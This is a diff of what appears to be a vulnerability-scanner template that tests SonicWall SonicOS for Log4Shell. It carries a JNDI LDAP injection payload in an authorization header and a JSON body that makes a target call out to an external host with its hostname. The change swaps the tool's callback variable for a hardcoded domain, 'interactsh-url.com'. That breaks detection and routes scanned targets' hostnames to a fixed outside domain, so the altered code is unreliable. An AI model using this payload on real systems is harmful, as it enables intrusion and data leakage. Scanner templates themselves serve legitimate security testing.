@@ -31,14 +31,14 @@ http:
         POST /api/sonicos/auth HTTP/1.1
         Host: {{Hostname}}
         X-Snwl-Timer: no-reset
-        Authorization: Digest username="${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/}", realm="admin-users@x.x.x.x", uri="/api/sonicos/auth", algorithm=SHA-256
+        Authorization: Digest username="${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.interactsh-url.com/}", realm="admin-users@x.x.x.x", uri="/api/sonicos/auth", algorithm=SHA-256
         Content-Type: application/json
         Accept: application/json, text/plain, /
         X-Snwl-Api-Scope: extended
         Origin: {{RootURL}}
         Referer: {{RootURL}}
 
-        {"override":false,"snwl":"${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/{{str}}}"}
+        {"override":false,"snwl":"${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.interactsh-url.com/{{str}}}"}
 
     matchers-condition: and
     matchers:
